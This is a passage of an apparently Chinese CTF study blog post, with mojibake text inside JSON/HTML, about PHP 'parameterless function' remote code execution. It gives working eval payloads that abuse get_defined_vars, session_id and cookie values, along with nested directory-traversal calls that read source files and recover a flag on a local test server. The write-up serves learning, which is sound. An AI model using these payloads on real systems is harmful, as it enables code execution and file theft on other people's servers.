class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"_COOKIE\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=></span>\n  <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"PHPSESSION\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=></span>\n    <span class=\"token keyword type-declaration\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token string double-quoted-string\">\"phpinfo();\"</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"_FILES\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=></span>\n  <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>è¿™ä¸ªè¿˜æ˜¯get_defined_vars()çš„ç»“æœï¼Œå¦‚æœè¿™é‡Œè¦åˆ©ç”¨å°±æ¯”è¾ƒéº»çƒ¦äº†å› ä¸ºå®ƒåœ¨å€’æ•°ç¬¬äºŒçš„ä½ç½®ä¸Šã€‚</p>\n<p>è¿™é‡Œæœ‰ä¸€ä¸ªç»†èŠ‚ï¼Œ<code>PHPSESSID=phpinfo()%2b</code>è¿™æ ·æ‰è¡Œï¼Œå› ä¸º<code>;</code>è¢«å½“ä½œåˆ†éš”è€Œä¸ä¼šè¢«åŒ…å«è¿›å»ï¼Œä½¿ç”¨urlç¼–ç å°±å¥½äº†ã€‚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027200942295.png\" alt=\"image-20201027200942295\"></p>\n<p>ä¹Ÿå¯ä»¥æˆåŠŸï¼Œä½†æ˜¯payloadçš„å°±æ²¡æœ‰é‚£ä¹ˆå¥½æå®šäº†ã€‚</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token argument-name\">http</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//test/?cmd=eval(current(next(array_reverse(get_defined_vars()))));</span>\n\n<span class=\"token argument-name\">Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token constant\">PHPSESSID</span><span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>b<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>è¿™æ˜¯è€åŠæ³•ï¼Œå¦‚æœä½¿ç”¨äº†session_id()å°±ä¼šä¸ä¸€æ ·äº†ã€‚</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token argument-name\">http</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//test/?cmd=eval(session_id(session_start()));</span>\n\n<span class=\"token argument-name\">Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token constant\">PHPSESSID</span><span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>b<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>å°±å¥½äº†ã€‚</p>\n<h2 id=\"dirname-amp-chdir\"><a href=\"#dirname-amp-chdir\" class=\"headerlink\" title=\"dirname() &amp; chdir()\"></a>dirname() &amp; chdir()</h2><p>getcwd()å‡½æ•°å¯ä»¥ç”¨æ¥è·å–å½“å‰ç›®å½•</p>\n<p>scandir()å‡½æ•°å¯ä»¥ç”¨æ¥è¯»å–ç›®å½•</p>\n<p>dirname()å‡½æ•°å¯ä»¥è·³åˆ°ä¸Šä¸€çº§ç›®å½•ã€‚</p>\n<p>chdir()å‡½æ•°å¯ä»¥ä¿®æ”¹å½“å‰ç›®å½•ã€‚</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http://test/?exp=var_dump(getcwd());\n\nstring(33) \"F:\\SoftWare\\phpstudy_pro\\WWW\\tset\"\n=====================================================\n\nhttp://test/?exp=var_dump(dirname(getcwd()));\n\nstring(28) \"F:\\SoftWare\\phpstudy_pro\\WWW\"\n=====================================================\n\nhttp://test/?exp=var_dump(scandir(dirname(getcwd())));\n\narray(7) &#123; [0]=> string(1) \".\" [1]=> string(2) \"..\" [2]=> string(5) \"error\" [3]=> string(10) \"index.html\" [4]=> string(10) \"phpMyAdmin\" [5]=> string(3) \"src\" [6]=> string(4) \"tset\" &#125;\n=====================================================\n\n//è¯»å‡ºäº†ä¸Šä¸€çº§ç›®å½•çš„zh.phpæ–‡ä»¶\nhttp://test/?cmd=show_source(end(scandir(dirname(chdir(dirname(getcwd()))))));\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//ä½ æ‰¾åˆ°æˆ‘äº†</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flag&#123;A1andNS&#125;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>è¿™ç§è€ƒæ³•ï¼Œè¯´åˆ°åº•å°±æ˜¯å†è€ƒPHPåŠŸåº•ï¼Œçœ‹ä½ çš„å¯¹PHPå‡½æ•°å’Œæ“ä½œçš„äº†è§£æƒ…å†µäº†ã€‚</p>\n<h2 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h2><p>[1]. <a href=\"https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE\">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE</a></p>\n<p>[2]. <a href=\"https://www.php.net/\">https://www.php.net/</a></p>\n","text":"æœ€è¿‘åšé¢˜é‡åˆ°äº†æ— å‚æ•°å‡½æ•°æ¥RCEçš„é¢˜ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ä¸€äº›æƒ³æ³•ï¼Œä»¥å¤‡åæ¥æŸ¥è¯ã€‚ è¿™ç§é¢˜ç›®çš„åšæ³•åŸºæœ¬ä¸Šå°±æ˜¯ï¼Œåˆ©ç”¨è¶…çº§å…¨å±€å˜é‡æ¥è¿›è¡Œbypassï¼Œåˆ©ç”¨å‡½æ•°çš„åµŒå¥—çš„æ›¿ä»£å‚æ•°çš„å‡ºç°ã€‚ç„¶åè¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ã€‚ æ— å‚æ•°å‡½æ•°é€šå¸¸æ¥è¯´å¦‚æœåœ¨PHPä¸­æœ‰ä¸€ä¸ªè¯­å¥ eval($_POST['cmd']); ...","link":"","photos":[],"count_time":{"symbolsCount":"5.9k","symbolsTime":"5 mins."},"categories":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","count":32,"path":"api/categories/å­¦ä¹ ç¬”è®°.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"Bypass","slug":"Bypass","count":1,"path":"api/tags/Bypass.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">æ— å‚æ•°å‡½æ•°</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%B6%85%E7%BA%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F\"><span class=\"toc-text\">è¶…çº§å…¨å±€å˜é‡</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#getenv\"><span class=\"toc-text\">getenv()</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#array-rand\"><span class=\"toc-text\">array_rand()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#array-flip\"><span class=\"toc-text\">array_flip()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#localeconv\"><span class=\"toc-text\">localeconv()</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#getallheaders\"><span class=\"toc-text\">getallheaders()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#get-defined-vars\"><span class=\"toc-text\">get_defined_vars()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#session-id\"><span class=\"toc-text\">session_id()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#dirname-amp-chdir\"><span class=\"toc-text\">dirname() &amp; chdir()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5\"><span class=\"toc-text\">å‚è€ƒé“¾æ¥</span></a></li></ol>","author":{"name":"æ²å­é¾","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"çˆ±ä½ æ‰€çˆ±ï¼Œè¡Œä½ æ‰€è¡Œï¼Œå¬ä»ä½ å¿ƒï¼Œæ— é—®è¥¿ä¸œ","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"RedHatå­¦ä¹ (ä¸€)","uid":"d5ddaa5391254c799899399e917138e4","slug":"RedHatå­¦ä¹ -ä¸€","date":"2020-11-04T13:25:26.000Z","updated":"2020-12-26T14:19:46.000Z","comments":true,"path":"api/articles/RedHatå­¦ä¹ -ä¸€.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200601211235.jpg","text":"è¿™ä¸ªæ˜¯redhatç³»ç»Ÿå­¦ä¹ ç³»åˆ—æ–‡ç« ï¼Œä¸ºäº†æå‡å¯¹linuxç³»ç»Ÿçš„äº†è§£å’Œç†Ÿæ‚‰ç¨‹åº¦ï¼Œæé«˜è¿ç»´èƒ½åŠ›ã€‚ rootç”¨æˆ·çªç„¶å¿˜è®°ï¼Œåˆæ€¥éœ€ä½¿ç”¨çš„æ—¶å€™å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ‰‹æ³•ï¼Œä½†æ˜¯å¦‚æœä½ è‡ªä¹ ä¸€æƒ³ï¼Œå¦‚æœä½ æ ¹æœ¬å°±ä¸çŸ¥é“å¯†ç ï¼Œåˆæƒ³è¦ç™»å½•rootè´¦æˆ·ï¼Œè¿™ç§æ‰‹æ³•å°±æœ‰ç‚¹æ„æ€äº†ï¼Œä»¿ä½›ææƒã€‚ ç´§æ€¥æ•‘æ´æ¨¡å¼æ¢å¤å¯†ç åœ¨å¯åŠ¨...","link":"","photos":[],"count_time":{"symbolsCount":"3k","symbolsTime":"3 mins."},"categories":[{"name":"Linuxå­¦ä¹ ","slug":"Linuxå­¦ä¹ ","count":7,"path":"api/categories/Linuxå­¦ä¹ .json"}],"tags":[{"name":"Linux","slug":"Linux","count":11,"path":"api/tags/Linux.json"},{"name":"Redhat","slug":"Redhat","count":5,"path":"api/tags/Redhat.json"}],"author":{"name":"æ²å­é¾","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"çˆ±ä½ æ‰€çˆ±ï¼Œè¡Œä½ æ‰€è¡Œï¼Œå¬ä»ä½ å¿ƒï¼Œæ— é—®è¥¿ä¸œ","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"BUUOJåˆ·é¢˜20201026-31","uid":"1be9c62e526acccb43c839a00721a69f","slug":"BUUOJåˆ·é¢˜20201026-31","date":"2020-10-26T11:30:40.000Z","updated":"2021-06-28T14:58:09.776Z","comments":true,"path":"api/articles/BUUOJåˆ·é¢˜20201026-31.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ ã€å›¾ç‰‡é©¬ ä¸Šä¼ ç»•è¿‡æ€ä¹ˆç»•å‘¢ï¼Œè¯•äº†ä¸Šä¼ php,php3ï¼Œphp4ï¼Œphtmléƒ½æ˜¯æ²¡è¿‡æ»¤äº†ã€‚è¯•äº†ä¸€ä¸‹jpgå’Œ.htaccessæ–‡ä»¶éƒ½å¯ä»¥ä¸Šä¼ ï¼Œæ‰€ä»¥å°±å¯ä»¥ä½¿ç”¨å›¾ç‰‡é©¬ï¼Œå¹¶ä¸”ç›´æ¥ç»™å‡ºäº†è·¯å¾„ï¼Œå‹å¥½ã€‚ ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ AddType...","link":"","photos":[],"count_time":{"symbolsCount":"7.6k","symbolsTime":"7 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"author":{"name":"æ²å­é¾","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"çˆ±ä½ æ‰€çˆ±ï¼Œè¡Œä½ æ‰€è¡Œï¼Œå¬ä»ä½ å¿ƒï¼Œæ— é—®è¥¿ä¸œ","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}